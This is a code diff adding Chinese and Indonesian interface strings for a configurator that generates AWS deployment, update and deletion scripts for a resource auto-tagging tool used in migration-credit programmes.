+            d_instr_what_stackset:'对于堆栈集：并行删除堆栈实例（100% 容差），然后删除堆栈集。',
+            d_instr_what_stack:'对于堆栈：运行 delete-stack 并等待完成。',
+            d_instr_what_bucket:'仅当该区域不再有 MAP Auto-Tagger 部署时才删除 S3 暂存存储桶。否则将保留以避免破坏同级部署。',
+            d_instr_logs_delete:'删除匹配的 CloudWatch 日志组。',
+            d_instr_logs_preserve:'CloudWatch 日志组（保留审计历史）。',
+            d_instr_preserved_title:'保留（永不删除）：',
+            d_instr_preserved_tags:'AWS 资源上的 map-migrated 标签（MAP 积分保持完整）。',
+            d_instr_preserved_iam:'堆栈集管理员和执行 IAM 角色（共享组织基础设施）。',
+            d_instr_idempotent:'幂等性：重新运行是安全的。缺失的资源报告为跳过，而非失败。',
+            ui_version_history_title:'版本历史 — 有何变更？',
+            ui_version_released:'发布日期',
+            ui_version_current:'当前目标',
+            ui_version_full_changelog:'GitHub 上的完整变更日志',
+            ui_version_tag_bugfix:'错误修复',
+            ui_version_tag_coverage:'新增覆盖',
+            ui_version_tag_breaking:'重大变更',
+            ui_version_tag_security:'安全',
+            ui_version_tag_perf:'性能',
+            ui_version_tag_other:'其他',
+            ui_editor_back:'← 返回',
+            ui_editor_review:'审核 →',
+            ui_editor_review_title:'审核配置',
+            ui_editor_review_subtitle:'在生成更新脚本之前验证您的设置',
+            ui_editor_review_accounts:'账户',
+            ui_editor_confirm_text:'我确认MAP Auto-Tagger已在选定区域使用指定的MPE ID进行部署，且两个值均正确。',
+            ui_editor_confirm_risk:'使用错误信息生成并运行此脚本可能会更新错误的StackSet、损坏账户范围，或导致资源被标记错误的MAP参与ID — 由此导致的MAP积分损失无法追溯恢复。',
+            err_editor_confirm:'生成更新脚本前必须确认',
+            ui_editor_generate:'生成update.sh →',
+            ui_editor_step3_title:'脚本已就绪',
+            ui_editor_step3_subtitle:'在管理账户的AWS CloudShell中运行',
+            ui_editor_download:'⬇ 下载update.sh',
+            ui_editor_script_preview:'脚本预览',
+            err_date_required:'请填写协议开始日期',
+            err_date_end:'协议结束日期必须晚于开始日期',
+            err_vpc_required:'请至少输入一个VPC ID。',
+            err_vpc_format:'VPC ID格式无效。必须是vpc-后跟8-17个十六进制字符（例如：vpc-0abc1234def56789）。',
+            err_duplicate_vpc:'检测到重复的VPC ID，请删除重复项。',
+            err_central_account_required:'请输入中央账户ID（12位数字）。',
+            d_title:'MAP 2.0 自动标记器设置',
+            d_tag_label:'标签值', d_region_label:'区域', d_account_label:'账户',
+            d_step1:'第1步/共3步：正在检查您的账户...',
+            d_step2:'第2步/共3步：正在设置自动标记器...',
+            d_step2_wait:'（通常需要1-2分钟）',
+            d_step2_wait_multi:'（通常需要10-15分钟）',
+            d_step3:'第3步/共3步：正在保存部署报告...',
+            d_ok_creds:'已成功连接到AWS账户。',
+            d_fail_creds:'无法连接到您的AWS账户。',
+            d_fix_creds:'您的会话可能已过期。请关闭并重新打开AWS CloudShell，然后重新运行此脚本。',
+            d_ok_trail:'区域的活动日志已启用：',
+            d_fail_trail:'区域未启用活动日志记录（CloudTrail）：',
+            d_fix_trail1:'请前往AWS控制台 → CloudTrail → 创建跟踪。',
+            d_fix_trail2:'请确保包含区域：',
+            d_ok_perms:'部署权限已就位。',
+            d_fail_perms:'您的账户没有所需的部署权限。',
+            d_fix_perms:'请联系AWS管理员授予AWS CloudFormation、IAM、AWS Lambda、Amazon EventBridge、AWS Systems Manager、Amazon SNS、Amazon SQS和Amazon CloudWatch权限。',
+            d_ok_org:'正在从正确的账户（管理账户或委托管理员）运行。',
+            d_ok_org_delegated:'以CloudFormation StackSets的委托管理员身份运行。',
+            d_fail_org:'此脚本必须从组织的管理账户或CloudFormation StackSets的委托管理员账户运行。',
+            d_fix_org:'请在AWS CloudShell中切换到管理账户（或委托管理员账户）并重新运行脚本。如不确定是哪个账户，请联系您的AWS账户团队。',
+            d_warn_stacksets:'多账户部署集成尚未启用 — 将在部署过程中自动设置。',
+            d_ok_stacksets:'多账户部署集成已启用。',
+            d_ok_scp:'没有安全策略阻止标签服务。',
+            d_ok_vpc:'此账户中存在VPC：',
+            d_fail_vpc:'在此账户/区域中找不到VPC：',
+            d_fix_vpc:'请验证VPC ID是否正确，且在目标账户和区域中存在。',
+            d_ok_account_scope:'组织中存在该账户：',
+            d_fail_account_scope:'在组织中找不到该账户：',
+            d_fix_account_scope:'请验证账户ID是否为属于您AWS组织的有效12位账户。',
+            d_fail_scp:'您组织中的安全策略正在阻止标签服务。',
+            d_fix_scp:"请联系AWS安全团队，允许Lambda执行角色使用'tag:TagResources'操作。",
+            d_scp_note:"（注意：如果您的组织要求在资源创建时必须存在标签，请让安全团队豁免'map-migrated'标签键。）",
+            d_all_passed:'所有检查均已通过。',
+            d_checks_failed:'项检查失败。请按照上述步骤操作，然后重新运行脚本。',
+            d_fix_label:'→ 解决方法：',
+            d_deploying:'部署正在进行中。您可以安全地按Ctrl+C — 部署将在后台继续。',
+            d_still_deploying:'仍在设置中...',
+            d_elapsed:'已用时',
+            d_deploy_failed:'设置失败。请将以下报告分享给您的AWS账户团队。',
+            d_complete_title:'设置完成！',
+            d_complete_single:'新资源将在创建后1-2分钟内自动添加标签（高峰期最长15分钟）。',
+            d_complete_multi:'自动标记现已在组织的所有账户中激活。',
+            d_backfill_msg:'回填即将运行。',
+            d_backfill_waiting:'等待回填完成...',
+            d_backfill_wait_info:'（回填即将开始，最多可能需要15分钟）',
+            d_backfill_starting:'回填正在运行...',
+            d_backfill_in_progress:'回填进行中...',
+            d_backfill_timeout:'回填仍在运行中。报告已保存 — 请在CloudWatch中查看最终结果:  aws logs tail /aws/lambda/map-auto-tagger-backfill',
+            d_backfill_done:'回填完成。',
+            r_backfill_result:'回填结果',
+            d_backfill_since:'它将对以下日期后创建的现有资源打标签：',
+            d_report_saved:'部署报告已保存至：',
+            d_share_report:'请将此文件分享给您的AWS账户团队。',
+            r_title:'MAP 2.0 自动标记器 — 部署报告',
+            r_customer:'客户', r_mpe:'MPE ID', r_region:'区域', r_account:'账户',
+            r_date:'日期/时间', r_result:'结果',
+            r_preflight:'预检查结果：',
+            r_deployed:'已部署内容：',
+            r_verify:'验证方法：',
+            r_backfill:'回填状态：',
+            r_perstatus:'账户状态：',
+            r_support:'技术支持：',
+            r_action:'需要采取的措施：',
+            r_verify1:'1. 在您的AWS账户中创建任意资源',
+            r_verify2:'2. 等待1-2分钟（繁忙时段最多15分钟）',
+            r_verify3:'3. 确认资源上有以下标签：map-migrated =',
+            r_share_help:'如需帮助，请将此报告分享给您的AWS账户团队。',
+            r_contact:'如需帮助，请联系您的AWS账户团队。',
+            r_action_desc:'请解决上述失败项后重新运行deploy.sh。'
+          },
+          id: {
+            ui_title:'MAP 2.0 Auto-Tagger Configurator',
+            ui_btn_download:'Unduh',
+                        ui_instr_opt1_title:'Opsi 1: AWS CloudShell (Direkomendasikan)',
+            ui_instr_opt2_title:'Opsi 2: AWS CLI Lokal',
+            ui_instr_cli_prereq_single:'Pastikan AWS CLI v2 terinstal dan dikonfigurasi dengan kredensial akun migrasi Anda.',
+            ui_instr_cli_prereq_multi:'Pastikan AWS CLI v2 terinstal dan dikonfigurasi dengan kredensial akun manajemen Anda.',
+            ui_instr_cli_download:'Unduh deploy.sh ke komputer Anda.',
+            ui_instr_cli_download_all:'Unduh semua 3 file ke komputer Anda.',
+            ui_instr_cli_terminal:'Buka terminal (Linux/macOS) atau WSL/Git Bash (Windows)',
+            ui_cli_alt_short:'Konfigurasi AWS CLI untuk akun tersebut dan jalankan:',
+            ui_instr_single_title:'INSTRUKSI DEPLOYMENT — Satu Akun',
+ui_instr_single_title:'INSTRUKSI DEPLOYMENT — Satu Akun',
+            ui_instr_multi_title:'INSTRUKSI DEPLOYMENT — Beberapa Akun',
+            ui_instr_login_single:'Login ke AWS Console untuk akun migrasi Anda.',
+            ui_instr_login_multi:'Login ke AWS Console untuk akun MANAJEMEN Anda.',
+            ui_instr_open_cloudshell:'Buka CloudShell (klik ikon terminal di menu bar atas).',
+            ui_instr_upload_files:'Unggah file (CloudShell → Actions → Upload file):',
+            ui_instr_upload_all:'Unggah semua 3 file (CloudShell → Actions → Upload file):',
+            ui_instr_run:'Jalankan:',
+            ui_instr_done_single:'Selesai. Skrip akan men-deploy dan mengonfirmasi ketika selesai.',
+            ui_instr_done_multi:'Selesai. Pemberian tag otomatis kini aktif di semua akun.',
+            ui_instr_verify_title:'Verifikasi tagging berfungsi (setelah deployment):',
+            ui_instr_expected:'Yang diharapkan',
+            ui_instr_thats_it:'Selesai. Pemberian tag otomatis aktif untuk 140+ jenis resource yang didukung.',
+            ui_instr_existing_only:'Resource yang ada TIDAK terpengaruh — hanya berlaku untuk resource yang baru dibuat.',
+            ui_instr_auto_handles:'Skrip menangani semuanya secara otomatis:',
+            ui_instr_uploads_s3:'Mengunggah template ke S3',
+            ui_instr_enables_stacksets:'Mengaktifkan StackSets di organisasi Anda',
+            ui_instr_discovers_org:'Menemukan struktur org Anda',
+            ui_instr_deploys_all:'Men-deploy ke semua akun (~10 menit)',
+            ui_instr_check_status:'Periksa status setelah berjalan',
+            ui_instr_files_received:'Anda menerima 3 file',
+            ui_instr_target_accounts:'Akun target',
+            ui_instr_all_accounts:'(tidak ada akun yang ditentukan)',
+            ui_instr_all_org:'semua akun dalam org',
+            ui_instr_cloudtrail_note:'CATATAN: CloudTrail harus diaktifkan di setiap akun dan region target.',
+            ui_sample_notice_title:'Catatan Kode Sampel:',
+            ui_sample_notice_body:"Ini adalah kode sampel untuk penggunaan non-produksi. Anda bertanggung jawab untuk menguji, mengamankan, dan mengoptimalkan solusi ini sesuai persyaratan keamanan, regulasi, dan kepatuhan organisasi Anda sebelum deployment. Men-deploy solusi ini dapat menimbulkan biaya AWS untuk AWS Lambda, Amazon EventBridge, Amazon CloudWatch, Amazon SNS, Amazon SQS, dan AWS Systems Manager. Lihat:",
+            ui_shared_responsibility:'Model Tanggung Jawab Bersama AWS',
+            ui_btn_copy:'Salin Instruksi',
+            ui_one_file_step:'Satu file. Satu langkah.',
+            ui_send_script:'Kirim',
+            ui_to_customer:'ke pelanggan.',
+            ui_cloudshell_open:'Mereka membuka',
+            ui_in_account:'di',
+            ui_upload_and_run:'AWS CloudShell, unggah file ini, dan jalankan:',
+            ui_mgmt_account:'akun manajemen',
+            ui_migration_account_label:'akun migrasi',
+            d_log_pass:'BERHASIL:',
+            d_log_fail:'GAGAL:',
+            d_log_warn:'PERINGATAN:',
+            ui_main_desc1:'Menghasilkan template CloudFormation yang secara otomatis memberi tag',
+            ui_main_desc2:'pada resource AWS baru dalam',
+            ui_main_desc3:'60–90 detik (hingga 15 menit saat aktivitas tinggi)',
+            ui_main_desc4:'setelah dibuat.',
+            ui_main_desc5:'Mencakup',
+            ui_main_desc6:'jenis resource di semua layanan AWS utama (diuji E2E di CT org).',
+            ui_main_desc7:'Biaya pelanggan:',
+            ui_step1:'1. Konfigurasi', ui_step2:'2. Tinjau', ui_step3:'3. Unduh',
+            ui_card_deal_title:'Detail Perjanjian MAP 2.0',
+            ui_card_deal_subtitle:'Masukkan detail perjanjian MAP dari AWS Investments',
+            ui_customer_name:'Nama Pelanggan', ui_customer_name_hint:'(hanya digunakan untuk pembuatan nama file)',
+            ui_customer_name_placeholder:'cth. PT ABC Indonesia',
+            ui_mpe_tag:'MAP Engagement ID',
+            ui_mpe_hint:'(Kode 10 karakter alfanumerik dari AWS Investments — contoh: A1B2C3D4E5)',
+            ui_agree_start:'Tanggal Mulai Perjanjian', ui_agree_start_hint:'(Tanggal mulai pemberian tag pada resource MAP 2.0)',
+            ui_agree_end:'Tanggal Berakhir Perjanjian', ui_agree_end_hint:'(Tanggal penghentian pemberian tag pada resource baru)',
+            ui_alert_email:'Email Peringatan', ui_alert_email_hint:'(opsional — email untuk menerima peringatan kesalahan tag)',
+            ui_alert_email_missing_warn:'⚠️ Tidak ada email peringatan yang diatur. Kegagalan tagging (IAM ditolak, kuota tag, drift layanan) akan dihentikan secara diam-diam — tidak ada SNS, tidak ada tujuan alarm DLQ. Anda dapat menambahkan pelanggan nanti melalui scripts/add_subscriber.sh atau menjalankan ulang configurator.\n\nLanjutkan tanpa pelanggan peringatan?',
+            ui_email_confirm_hint:'Pelanggan harus mengonfirmasi email langganan AWS setelah deployment.',
+            ui_deploy_mode:'Mode Deployment', ui_deploy_mode_subtitle:'Pilih jumlah akun AWS yang digunakan untuk migrasi',
+            ui_single_title:'Satu Akun', ui_single_desc:'Deploy ke satu akun migrasi. Selesai dalam 2 menit.',
+            ui_multi_title:'Beberapa Akun (AWS Organizations)', ui_multi_desc:'Deploy ke semua akun AWS Organization sekaligus menggunakan StackSet.',
+            ui_backfill_title:'Backfill Satu Kali', ui_optional:'(opsional)',
+            ui_coverage_title:'Resource yang Akan Diberi Tag',
+            ui_btn_next:'Berikutnya: Tinjau →', ui_btn_back:'← Kembali', ui_btn_generate:'Buat & Unduh →',
+            ui_tagging_scope:'Cakupan Tag', ui_vpc_scope_hint:'Secara default semua resource baru di akun akan diberi tag. Gunakan VPC scoping jika workload migrasi dan non-migrasi berbagi akun yang sama.',
+            ui_vpc_limit:'Batasi pemberian tag hanya pada VPC tertentu',
+            ui_tag_non_vpc:'Beri tag juga pada resource non-VPC (S3, DynamoDB, Lambda, SNS, SQS, dll.)',
+            ui_tag_non_vpc_hint:'Layanan ini tidak memiliki asosiasi VPC. Disarankan untuk memberi tag pada semua resource ini terlepas dari cakupan VPC untuk kelayakan MAP.',
+            ui_vpc_ids:'VPC ID', ui_vpc_ids_hint:'(hanya resource yang terikat VPC dalam VPC ini yang akan diberi tag)',
+            ui_add_vpc:'+ Tambah VPC', ui_add_account:'+ Tambah akun', ui_add_region:'+ Tambah region',
+            ui_migration_account_ids:'ID Akun Migrasi', ui_migration_account_ids_hint:'(untuk referensi — stack akan otomatis di-deploy ke seluruh org)',
+            ui_stackset_note:'Lambda di-deploy ke setiap akun dalam org melalui root OU. Secara default, resource semua akun akan diberi tag. Anda dapat membatasi pemberian tag hanya pada akun tertentu.',
+            ui_stackset_bucket_note:'Deployment ini membuat bucket S3 sementara (auto-map-tagger-{account-id}) untuk menyimpan template CloudFormation bagi StackSet. Bucket dipertahankan setelah deployment karena StackSet memerlukannya untuk men-deploy ke akun baru yang bergabung dengan organisasi Anda di masa mendatang.',
+            ui_account_limit:'Batasi pemberian tag hanya pada akun tertentu',
+            err_account_scope_required:'Harap masukkan setidaknya satu ID akun.',
+            err_account_format:'ID akun tidak valid. Harus tepat 12 digit angka.',
+            err_duplicate_account:'ID akun duplikat terdeteksi. Hapus duplikat.',
+            ui_central_account_id:'ID Akun Pusat', ui_central_account_id_hint:'(akun tempat Lambda akan di-deploy)',
+            ui_member_accounts:'Akun Anggota dalam Cakupan MAP',
+            ui_deployment_regions:'Region Deployment', ui_deployment_regions_hint:'(region tempat pelanggan membuat resource)',
+            ui_backfill_strong:'Beri tag pada resource yang dibuat sejak tanggal mulai perjanjian',
+            ui_backfill_scope_note:'✓ Cakupan diterapkan: backfill akan mengikuti pengaturan cakupan VPC/akun yang dipilih di atas.',
+            ui_backfill_desc:'Men-deploy Lambda satu kali yang mengquery riwayat CloudTrail dari tanggal mulai perjanjian dan memberi tag pada semua resource yang dibuat sebelum solusi ini di-deploy. Berjalan otomatis ~5 menit setelah deployment.',
+            ui_backfill_note:'Catatan: Riwayat CloudTrail terbatas pada 90 hari terakhir. Resource yang dibuat sebelum periode tersebut harus diberi tag secara manual.',
+            ui_coverage_subtitle:'140+ jenis resource yang telah diverifikasi melalui pengujian multi-akun CT org (4 akun × 4 region)',
+            ui_review_title:'Tinjau Konfigurasi', ui_review_subtitle:'Verifikasi pengaturan sebelum menghasilkan template',
+            ui_what_deployed:'Yang Akan Di-deploy',
+            ui_template_ready:'Template Siap', ui_template_ready_subtitle:'Bagikan ini beserta instruksi deployment di bawah kepada pelanggan',
+            ui_prereq_title:'Prasyarat Pelanggan', ui_prereq_subtitle:'deploy.sh yang dihasilkan akan memverifikasi ini secara otomatis sebelum deployment:',
+            ui_prereq_cloudtrail:'CloudTrail harus diaktifkan di region target',
+            ui_prereq_perms:'Deployer harus memiliki izin AWS CloudFormation (IAM, AWS Lambda, Amazon EventBridge, AWS Systems Manager, Amazon SNS, Amazon SQS, Amazon CloudWatch)',
+            ui_prereq_org:'Akun manajemen harus mengaktifkan AWS Organizations dan trusted access CloudFormation StackSets',
+            ui_scp_title:'⚠️ Peringatan Kebijakan Kontrol Layanan (SCP)',
+            ui_scp_intro:'Jika organisasi pelanggan menggunakan SCP, verifikasi hal berikut sebelum deployment:',
+            ui_deploy_instructions:'Instruksi Deployment Pelanggan',
+            ui_template_preview:'Pratinjau Template', ui_download_template:'Unduh Template CloudFormation', ui_download_template_note:'Opsional — untuk pelanggan yang ingin meninjau kode CloudFormation sebelum deployment.', ui_start_over:'Mulai Ulang',
+            ui_cost_note:'Estimasi biaya bulanan: ', ui_cost_note2:' / akun (invokasi Lambda + CloudWatch). Tidak memerlukan AWS Config.',
+            ui_scp_tagging:'SCP Tagging — pastikan SCP tidak menolak tag:TagResources, ec2:CreateTags, atau tindakan tagging lainnya untuk peran eksekusi Lambda. deploy.sh akan menjalankan pemeriksaan simulasi IAM pasca-deployment, tetapi SCP memerlukan verifikasi manual di konsol AWS Organizations.',
+            ui_scp_mandatory:'SCP Tagging Wajib — jika SCP mengharuskan tag ada saat resource dibuat, solusi ini tidak akan memenuhi persyaratan tersebut (tag diterapkan 60-90 detik setelah pembuatan). Pelanggan harus mengecualikan kunci tag map-migrated atau menggunakan masa tenggang.',
+            rv_not_specified:'(tidak ditentukan)', rv_none:'(tidak ada)', rv_none_specified:'(tidak ditentukan)',
+            rv_yes:'Ya', rv_no:'Tidak', rv_disabled:'Dinonaktifkan', rv_enabled:'Diaktifkan',
+            rv_multi_method:'Metode Multi-Akun', rv_stackset:'StackSet (Lambda per akun)', rv_central:'Lambda Pusat (lintas akun)',
+            rv_target_accounts:'Akun Target', rv_tag_non_vpc:'Tag layanan non-VPC',
+            rv_all_resources:'Semua resource di akun target',
+            rv_backfill_enabled:'Diaktifkan — memberi tag resource yang ada sejak tanggal mulai perjanjian (~5 menit setelah deployment)',
+            rv_desc_single:'Satu CloudFormation stack. Deploy langsung di akun pelanggan:',
+            rv_desc_stackset:'Dua file dihasilkan. Deploy template akun manajemen sekali — otomatis menemukan struktur org dan menyediakan akun yang ditentukan:',
+            rv_desc_central:'Lambda pusat di satu akun + peran IAM lintas akun di setiap akun anggota:',
+            rv_deploy_mgmt:'deploy ke akun manajemen', rv_deploy_accounts:'diunggah ke S3, di-deploy ke setiap akun',
+            rv_targets:'Target', rv_specific_accounts:'akun tertentu', rv_targets_all:'Menargetkan SEMUA akun dalam organisasi',
+            rv_res_lambda:'Fungsi AWS Lambda', rv_res_lambda_desc:'Memberi tag resource baru secara otomatis dalam 60-90 detik setelah dibuat',
+            rv_res_eventbridge:'Aturan Amazon EventBridge', rv_res_eventbridge_desc:'Menangkap 200+ event Create/Run/Put/Publish di semua layanan',
+            rv_res_ssm:'Parameter AWS Systems Manager', rv_res_ssm_desc:'Menyimpan MAP ID, tanggal perjanjian, konfigurasi cakupan',
+            rv_res_iam:'Peran IAM', rv_res_iam_desc:'100+ izin tagging spesifik layanan, hak akses minimal',
+            rv_res_dlq:'Antrean Dead Letter Amazon SQS', rv_res_dlq_desc:'Menangkap event tagging yang gagal untuk dicoba ulang/diaudit',
+            rv_res_sns:'Topik Amazon SNS + Amazon CloudWatch Alarm', rv_res_sns_desc:'Memberi notifikasi saat terjadi error tagging (>3 kegagalan dalam 5 menit)',
+            rv_res_custom:'Resource Kustom (Lambda)', rv_res_custom_desc:'Otomatis menemukan ID OU root saat deployment — pelanggan tidak perlu melakukan apa pun',
+            err_mpe_invalid:"MAP ID harus tepat 10 karakter, hanya huruf besar Inggris (A–Z) dan angka (0–9), serta minimal satu huruf dan satu angka",
+            ui_landing_title:'Apa yang ingin Anda lakukan?',
+            ui_landing_subtitle:'Pilih opsi untuk memulai',
+            ui_mode_deploy_title:'Deploy MAP Auto-Tagger Baru',
+            ui_mode_deploy_desc:'Buat skrip deployment untuk engagement MAP 2.0 baru. Mendukung deployment satu akun dan multi-akun (AWS Organizations).',
+            ui_mode_edit_title:'Edit deployment yang ada',
+            ui_mode_edit_desc:'Tambah atau hapus akun AWS dari cakupan MAP Auto-Tagger yang sudah di-deploy. Membuat skrip pembaruan — tanpa perlu deploy ulang.',
+            ui_mode_edit_note:'Hanya untuk deployment multi-akun (AWS Organizations)',
+            ui_estep1:'1. Konfigurasi', ui_estep2:'2. Tinjau', ui_estep3:'3. Unduh',
+            ui_editor_info:'Alat ini memodifikasi deployment yang ada yang dibuat oleh MAP Auto-Tagger Configurator. Ini menghasilkan skrip update.sh yang memperbarui cakupan akun tanpa perlu deploy ulang.',
+            ui_editor_step1_title:'Detail Deployment',
+            ui_editor_step1_subtitle:'Masukkan detail deployment MAP Auto-Tagger Anda yang sudah ada',
+            ui_editor_mpe_hint:'— kode alfanumerik 10 karakter, harus sesuai dengan deployment asli',
+            ui_editor_region:'Wilayah Deployment',
+            ui_editor_region_hint:'— wilayah tempat management stack di-deploy',
+            ui_editor_region_placeholder:'Pilih wilayah...',
+            err_editor_region:'Silakan pilih wilayah deployment',
+            ui_editor_action_title:'Tindakan',
+            ui_editor_action_subtitle:'Pilih apakah akan menambah atau menghapus akun dari cakupan MAP',
+            ui_editor_add_title:'Tambahkan akun ke cakupan MAP',
+            ui_editor_add_desc:'Akun yang dipilih akan mulai diberi tag MAP.',
+            ui_editor_add_accounts_label:'ID Akun yang akan ditambahkan',
+            ui_editor_add_accounts_hint:'— hanya akun yang belum ada di cakupan',
+            err_editor_account:'Masukkan setidaknya satu ID akun 12 digit yang valid',
+            ui_editor_backfill_title:'Jalankan ulang backfill untuk akun yang baru ditambahkan',
+            ui_editor_backfill_desc:'Mengkueri riwayat CloudTrail dari tanggal mulai perjanjian dan memberi tag pada sumber daya yang ada di akun baru. Berjalan otomatis selama pembaruan StackSet. Hasilnya muncul di CloudWatch Logs (map-auto-tagger-backfill).',
+            ui_editor_backfill_note:'Catatan: Riwayat CloudTrail dibatasi hingga 90 hari terakhir. Sumber daya yang dibuat sebelum periode tersebut harus diberi tag secara manual.',
+            ui_editor_remove_title:'Hapus akun dari cakupan MAP',
+            ui_editor_remove_desc:'Akun yang dipilih tidak akan lagi diberi tag. Tag yang ada tidak dihapus. Lambda tetap di-deploy tetapi tidak aktif untuk akun-akun ini.',
+            ui_editor_remove_accounts_label:'ID Akun yang akan dihapus',
+            ui_editor_remove_accounts_hint:'— hanya akun yang saat ini ada di cakupan',
+            ui_mode_update_title:'Perbarui ke versi template terbaru',
+            ui_mode_update_desc:'Tingkatkan kode Lambda, kebijakan IAM, dan aturan EventBridge ke versi template saat ini. Konfigurasi cakupan (akun, VPC, tanggal perjanjian) dipertahankan. Mendeteksi otomatis deployment akun tunggal dan multi-akun.',
+            ui_ustep1:'1. Konfigurasi',
+            ui_ustep2:'2. Tinjau',
+            ui_ustep3:'3. Unduh',
+            ui_update_info:'Alat ini meningkatkan deployment MAP Auto-Tagger yang ada ke versi template terbaru. Menghasilkan skrip <code>update.sh</code> yang mempertahankan konfigurasi cakupan dan mendeteksi otomatis deployment akun tunggal dan multi-akun.',
+            ui_update_step1_title:'Detail Deployment',
+            ui_update_step1_subtitle:'Masukkan wilayah dan cakupan opsional untuk pembaruan',
+            ui_update_info_detail:'Skrip <code>update.sh</code> yang dihasilkan membaca versi template saat ini dari SSM Parameter Store (<code>/auto-map-tagger/&lt;mpe&gt;/version</code>), membandingkannya dengan versi target, dan menolak pembaruan lintas-mayor (misalnya v19 → v21) tanpa <code>--force</code>. Tindakan pelanggan hanya diperlukan untuk peningkatan MAJOR per SemVer.',
+            ui_update_scope_title:'Perbarui hanya keterlibatan MAP tertentu',
+            ui_update_scope_desc:'Biarkan tidak dicentang untuk memperbarui setiap deployment MAP Auto-Tagger yang ditemukan skrip di akun ini (kedua stack dan stackset yang cocok dengan <code>map-auto-tagger-mig*</code>).',
+            ui_update_mpe_label:'MPE ID yang akan diperbarui',
+            ui_update_mpe_hint:'— setiap MPE harus cocok dengan MAP Auto-Tagger yang di-deploy di wilayah ini',
+            ui_update_add_mpe:'+ Tambahkan MPE lain',
+            err_update_mpe:'Masukkan setidaknya satu MPE ID 10 karakter yang valid',
+            ui_update_scope_review:'Cakupan pembaruan',
+            ui_update_all_review:'semua deployment MAP Auto-Tagger di akun ini',
+            ui_update_target_version:'Versi template target',
+            ui_update_confirm_text:'Saya mengonfirmasi bahwa deployment MAP Auto-Tagger yang tercantum ada di wilayah yang dipilih dan peningkatan ke versi template target sudah sesuai.',
+            ui_update_confirm_risk:'Peningkatan akan menggantikan kode Lambda, kebijakan IAM, dan aturan EventBridge di setiap stack yang cocok. Cakupan dan tanggal perjanjian dipertahankan melalui <code>--use-previous-parameters</code>, tetapi rollout yang gagal dapat membuat stack dalam keadaan UPDATE_ROLLBACK_COMPLETE yang memerlukan pemulihan manual.',
+            err_update_confirm:'Anda harus mengonfirmasi sebelum menghasilkan skrip pembaruan',
+            ui_update_step3_subtitle:'Jalankan di AWS CloudShell dari akun tempat deployment dibuat',
+            ui_mode_delete_title:'Hapus deployment yang ada',
+            ui_mode_delete_desc:'Hapus deployment MAP Auto-Tagger dari akun. Secara default menghapus setiap stack dan stackset map-auto-tagger-mig* di region; secara opsional dapat dibatasi untuk MPE tertentu. Tag map-migrated tidak dihapus dari resource yang sudah diberi tag.',
+            ui_dstep1:'1. Konfigurasi',
+            ui_dstep2:'2. Tinjau',
+            ui_dstep3:'3. Unduh',
+            ui_delete_info:'Alat ini menghapus deployment MAP Auto-Tagger dari akun Anda. Alat ini menghasilkan skrip delete.sh yang secara otomatis mendeteksi stack akun tunggal dan StackSet multi-akun. Secara default, setiap deployment map-auto-tagger-mig* di region yang dipilih akan dihapus. Tag map-migrated tidak dihapus dari resource yang sudah diberi tag — tag tersebut tetap ada sehingga kredit MAP tetap utuh.',
+            ui_delete_step1_title:'Detail Deployment',
+            ui_delete_step1_subtitle:'Pilih region yang akan dihapus',
+            ui_delete_scope_title:'Batasi ke keterlibatan MAP (MPE) tertentu',
+            ui_delete_scope_desc:'Jangan centang untuk menghapus setiap deployment MAP Auto-Tagger yang ditemukan di region ini (baik stack maupun stackset yang cocok dengan map-auto-tagger-mig*).',
+            ui_delete_scope_all:'Semua deployment map-auto-tagger-mig* di region ini',
+            ui_delete_scope_specific:'MPE tertentu',
+            ui_delete_mpe_label:'ID MPE yang akan dihapus',
+            ui_delete_mpe_hint:'— masing-masing harus cocok dengan MAP Auto-Tagger yang di-deploy di region ini',
+            ui_delete_add_mpe:'+ Tambahkan MPE lain',
+            err_delete_mpe:'ID MAP Engagement harus tepat 10 karakter, huruf Inggris kapital (A–Z) dan angka (0–9) saja, dengan setidaknya satu huruf dan satu angka',
+            ui_delete_optin_title:'Opsional — CloudWatch Log Groups',
+            ui_delete_optin_logs:'Hapus CloudWatch Log Groups',
+            ui_delete_optin_logs_hint:'— menghapus riwayat audit. Secara default log dipertahankan.',
+            ui_delete_optin_bucket:'Bucket staging S3',
+            ui_delete_bucket_conditional:'Dihapus hanya jika tidak ada deployment lain yang tersisa',
+            ui_delete_bucket_yes:'Ya — tidak ada deployment yang tersisa',
+            ui_delete_bucket_note:'Bucket staging S3 ditangani secara otomatis: dihapus hanya jika tidak ada deployment MAP Auto-Tagger lain yang tersisa di akun.',
+            ui_delete_review_subtitle:'Konfirmasi apa yang akan dihapus',
+            ui_delete_confirm_title:'⚠️ Ketik DELETE untuk mengonfirmasi',
+            ui_delete_confirm_hint:'Tindakan ini menghapus resource CloudFormation. Tag map-migrated yang ada pada resource AWS dipertahankan, tetapi Lambda akan segera berhenti memberi tag pada resource baru.',
+            ui_delete_confirm_label:'Ketik kata DELETE untuk mengonfirmasi',
+            err_delete_confirm:'Ketik kata "DELETE" untuk melanjutkan',
+            ui_delete_generate:'Hasilkan delete.sh →',
+            ui_delete_download:'⬇ Unduh delete.sh',
+            ui_delete_step3_subtitle:'Jalankan di AWS CloudShell dari akun tempat deployment dibuat',
+            d_instr_title:'INSTRUKSI HAPUS — MAP Auto-Tagger',
+            d_instr_region_label:'Region:',
+            d_instr_scope_label:'Cakupan:',
+            d_instr_version_label:'Versi template:',
+            d_instr_scope_specific:'MPE —',
+            d_instr_scope_all:'semua deployment MAP Auto-Tagger di region ini',
+            d_instr_opt1:'Opsi 1: AWS CloudShell (Direkomendasikan)',
+            d_instr_opt1_step1:'1. Masuk ke AWS Console untuk akun tempat deployment dibuat.\n   (Untuk deployment multi-akun, ini adalah akun manajemen.)',
+            d_instr_opt1_step2:'2. Buka CloudShell.',
+            d_instr_opt1_step3:'3. Unggah delete.sh dan jalankan:',
+            d_instr_opt2:'Opsi 2: AWS CLI lokal',
+            d_instr_opt2_step1:'1. Pastikan AWS CLI v2 sudah terinstal dan dikonfigurasi dengan kredensial admin.',
+            d_instr_opt2_step2:'2. Jalankan: bash delete.sh',
+            d_instr_what_title:'Apa yang dilakukan skrip:',
+            d_instr_what_scoped:'Mencari Stack atau StackSet setiap MPE yang tercantum dan menghapusnya.',
+            d_instr_what_all:'Mencantumkan setiap Stack dan StackSet map-auto-tagger-mig* di region dan menghapusnya.',
+            d_instr_what_stackset:'Untuk StackSet: menghapus instance stack secara paralel (toleransi 100%), lalu StackSet.',
+            d_instr_what_stack:'Untuk Stack: menjalankan delete-stack dan menunggu hingga selesai.',
